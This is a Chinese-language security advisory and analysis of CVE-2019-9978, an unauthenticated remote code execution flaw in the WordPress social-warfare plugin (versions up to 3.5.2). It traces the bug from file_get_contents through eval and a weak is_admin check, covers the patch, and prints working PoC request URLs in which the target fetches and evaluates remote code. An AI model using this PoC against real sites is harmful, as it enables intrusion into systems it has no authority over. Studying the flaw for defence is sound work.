**作者：天融信阿尔法实验室  
公众号：<https://mp.weixin.qq.com/s/jqdXGIG9SRKniI_2ZhKNJQ>**

## 一、背景介绍

social-warfare是一款 WordPress社交分享按钮插件。 不同于大多数WordPress社交分享插件，social-warfar最大的优势在于其轻便性与高效性。它不会像其他共享插件一样减慢网站速度，这也是很多用户使用其作为自己网站社交分享插件的原因。

该插件被wordpress用户广泛的应用： 从官网看，该插件官方的统计是超过90万的下载量
![](https://images.seebug.org/content/images/2019/05/495be8e1-0200-42aa-b3e1-5e1ec2878d82.png-w331s)

### 1.1漏洞描述

在`social-warfare <=
3.5.2`版本中，程序没有对传入参数进行严格控制以及过滤，导致攻击者可构造恶意payload，无需后台权限，直接造成远程命令执行漏洞。

攻击成功的条件只需要如下两条：  
1\. 目标wordpress站点上安装有social-warfare  
2\. social-warfare插件的版本小于或等于3.5.2

只要符合以上两个条件，无需复杂的payload构造，即可通过简简单单的一个get请求，远程执行任意代码。  
与wordpress自身漏洞修补不同，对于插件的漏洞，wordpress并不会在后台对该插件进行自动升级，仅仅是提示有新版本可用。
![](https://images.seebug.org/content/images/2019/05/a8956d50-dd3e-41f1-8cc9-3c630f6f954f.png-w331s)
简言之，由于该机制的存在，目前还有大部分使用该插件的站长，所使用着仍存在漏洞版本的social-warfare插件，面临着被攻击的风险。  
于此同时，这个漏洞，还是一个洞中洞，开发者的一连串失误，将该漏洞威胁等级逐步增高。

### 1.2受影响的系统版本

    
    
    social-warfare<= 3.5.2

### 1.3.漏洞编号

**CVE-2019-9978**

## 二、漏洞细节

social-warfare安装后如下图
![](https://images.seebug.org/content/images/2019/05/1e97ab97-e595-41af-a310-643069c2009c.png-w331s)
如图中红框所见，该插件提供了一个简洁易用的分享功能栏。

首先，通过github的commit记录，找到漏洞触发点

漏洞触发点位于`/wp-content/plugins/social-warfare-3.5.2/lib/utilities/SWP_Database_Migration.php`中的`debug_parameters`方法中

首先分析下`debug_parameters`方法
![](https://images.seebug.org/content/images/2019/05/c3128f87-e31d-4030-a8e2-cf61e825f0c7.png-w331s)
该方法提供了一种允许更容易调试数据库迁移功能的方法。

先来看下`get_user_options`功能的代码块
![](https://images.seebug.org/content/images/2019/05/c0084614-46a8-4bc7-b06c-31263f5f1770.png-w331s)
此处功能模块加载 `wp-content/plugins/social-warfare-3.5.2/lib/utilities/SWP_Database_Migration.php`
中`initialize_database`方法中的`$defaults`数组中的配置信息，如下图
![](https://images.seebug.org/content/images/2019/05/2cb22f7a-7532-4375-8abb-597fb1260526.png-w331s)

在访问与执行该功能模块后，返回相应的配置信息
![](https://images.seebug.org/content/images/2019/05/ec57d875-a5f6-4867-bbda-e74938bb84d6.png-w331s)

接下来分析漏洞触发点 位于如下图中的if分支中
![](https://images.seebug.org/content/images/2019/05/bd34c23f-0279-4cab-9044-dbfc0745eaa0.png-w331s)
也就是在`’load_options’`这个功能模块中。该功能模块，是开发者用来调试数据库迁移功能的，在对用户实现实际的业务功能中，该模块并没有被使用过。

逐行分析下此功能模块 首先，可以看到如下图代码块:
![](https://images.seebug.org/content/images/2019/05/184a9fbd-8e54-4b6c-b57b-d9d6ec73accd.png-w331s)
如红框中所见，这里的代码看起来，需要通过`is_admin()`方法的校验。看起来，这里需要有`admin`权限才可以执行后续代码触发漏洞。按照以往经验，这是一个需要后台权限才可以代码执行的漏洞（但这里的推测并不正确，具体的见下文分析）

紧接着，通过`file_get_contents`方法，发送请求
![](https://images.seebug.org/content/images/2019/05/1dd0bd49-c63a-4a02-af29-e2153a15672d.png-w331s)
其中的`$_GET[‘swp_url’]`我们可控，例如：

    
    
    http://127.0.0.1/1.php

![](https://images.seebug.org/content/images/2019/05/cb84d3d6-ae5a-4837-9fb0-664efcc1dbe7.png-w331s)
这样`file_get_contents`会访问

    
    
    http://127.0.0.1/1.php?swp_debug=get_user_options

并将我们构造好的payload传递给$options变量
到此为止，我们通过构造链接传入`file_get_contents`，达到完全可控`$options`变量中的内容的目的

接下来，会从`$options`变量中提取出内容，并进行解析，如下图
![](https://images.seebug.org/content/images/2019/05/8698e657-0167-4991-aa3c-92ecbc51a17d.png-w331s)
随后，将解析出的`$options`值拼接后赋予`$array`

如使用我们案例中的`1.php`,那么`$array`的值为

    
    
    return phpinfo()

接下来，`$array`中的值会传递入eval中，造成代码执行
![](https://images.seebug.org/content/images/2019/05/71074d38-a505-4d7f-be71-843a2548dc48.png-w331s)

**实际效果如下图**
![](https://images.seebug.org/content/images/2019/05/df904dcd-6ab9-4191-a834-52d21d5421d5.png-w331s)

**漏洞分析到此结束，本次漏洞影响很大，但漏洞自身没有什么亮点**

**接下来，看一下官方是如何修补的**  
通过github的commit记录，获取此次的修补方案。
![](https://images.seebug.org/content/images/2019/05/5ff2f987-f72b-4ab8-b17e-0a78ce95f357.png-w331s)
此次修补，将`lib/utilities/SWP_Database_Migration.php`中的221-284行，将`debug_parameters`方法中存在问题的`load_options`模块代码全部删除
所以不存在绕过补丁的可能性。

在分析此漏洞时，有几处有意思的地方，和大家分享一下：  
**思考一：**  
先来看下如下操作：  
首先，我们退出wordpress登陆
![](https://images.seebug.org/content/images/2019/05/ab3e0038-5d3d-41f7-a77c-6839daf016c4.png-w331s)
可见，此时我们并没有登陆，也没有admin权限  
接着，我们访问poc

    
    
    http://127.0.0.1/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://127.0.0.1/1.php

![](https://images.seebug.org/content/images/2019/05/723a1d49-4dec-457e-9a0e-197263b3bffd.png-w331s)
payload仍然可以触发  
还记得上文此处
![](https://images.seebug.org/content/images/2019/05/b6cb689d-cc2b-416e-b431-ef3f99b5176e.png-w331s)
在漏洞分析环节，我们的猜测是，由于`is_admin`方法的校验，此处应该是后台漏洞，但是在没有登陆的情况下，仍然触发了。  
这是为什么呢？  
原因如下： 先来看看`is_admin`方法是如何实现的  
位于`/wp-includes/load.php`中
![](https://images.seebug.org/content/images/2019/05/1f46eb8e-da5b-4472-8e21-12f0e0c43ade.png-w331s)
可以看到，有一个`if-elseif`判断  
在`elseif`中判断`defined (‘WP_ADMIN’)`的值  
由于我们构造的payload，入口是`admin-post.php`

看一下`admin-post.php`
![](https://images.seebug.org/content/images/2019/05/11bfe45d-0903-499f-a540-689be85fc912.png-w331s)
第3行将`WP_ADMIN`定义为true

也就是说，`is_admin`方法，检查的是：此时运行时常量`WP_ADMIN`的值是否为true。  
在wordpress中，`WP_ADMIN`只是用来标识该文件是否为后台文件。大多数后台文件，都会在脚本中定义`WP_ADMIN`为true(例如`wp-admin`目录下的`admin-post.php`等)，
因此`is_admin`方法检测通过时，只能说明此是通过后台文件作为入口，调用`debug_parameters`方法，并不能有效的验证此时访问者的身份是否是admin

![](https://images.seebug.org/content/images/2019/05/4bc9c8a7-e73f-48aa-8f5c-bc116495b2e0.png-w331s)
前台index.php无法触发

![](https://images.seebug.org/content/images/2019/05/14816c21-de5c-4ce3-b864-51f1d711afd9.png-w331s)
`wp-admin`目录下的`about.php`可以触发
![](https://images.seebug.org/content/images/2019/05/f75344c5-c751-4094-b43f-a2d74093736c.png-w331s)

可见，wp-admin下任意文件为入口，都可以触发该漏洞，也就是说，在构造payload以及进行防护时，需要注意

    
    
    http://127.0.0.1/wordpress/wp-admin/[xxx].php?swp_debug=load_options&swp_url=http://127.0.0.1/1.php

这里xxx可以是绝大多数后台php文件

**思考二：** 访问`http://127.0.0.1/wordpress/index.php?swp_debug=get_user_options`
时，是如何将get请求中的`swp_debug=get_user_options`与`get_user_options`功能模块关联起来，调用此功能模块执行相应的功能呢？
![](https://images.seebug.org/content/images/2019/05/df6e1172-82ea-4e17-a939-82af931294d2.png-w331s)

同理，当访问`http://127.0.0.1/wordpress/index.php?swp_debug=load_options`
时，后台是如何解析get请求，并找到load_options模块的？
![](https://images.seebug.org/content/images/2019/05/395ffe6f-6ddc-4762-9f82-06a8a1a8e998.png-w331s)

开始的时候，笔者以为是有相关的路由配置(类似于django中的url解析)，或者说是类似MVC结构中的控制器（类似thinkphp中的url普通模式`http://localhost/?m=home&c=user&a=login&var=value）`这样的结构，但实际真相很简单：

见下图，`SWP_Utility::debug`方法
![](https://images.seebug.org/content/images/2019/05/7a1104b8-adf6-4d81-bfd3-a3207bfbc0c7.png-w331s)

![](https://images.seebug.org/content/images/2019/05/a61fe4a7-8944-41b7-8142-18d04f171bb6.png-w331s)
在`debug_parameters`方法中的所有if分支中逐个执行debug方法，逐个将debug方法内注册的值（`’load_options’`、`’get_user_options’`等）和get请求中`swp_debug`的值进行比较，如果一样，则执行该功能模块的代码，如果不一样，则进入下个if中。道理同等于switch

回顾： 此次漏洞，粗看很无趣，细看很有意思  
首先，传入`file_get_contents`中内容没有被限制，导致可以访问任意网址  
其次，`file_get_contents`返回结果，没有经过任何过滤，直接被eval执行  
最终，`is_admin`方法，本来应该将此漏洞限制在后台，但错误的权限控制，导致无需后台权限的代码执行  
而且，开发者根本不改，直接删除功能模块了事

## 三、修复建议

目前官方已修复该漏洞，可从官网下载最新版本。由于官方已经将存在漏洞的代码段彻底删除，不存在后续补丁绕过等问题。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/919/>

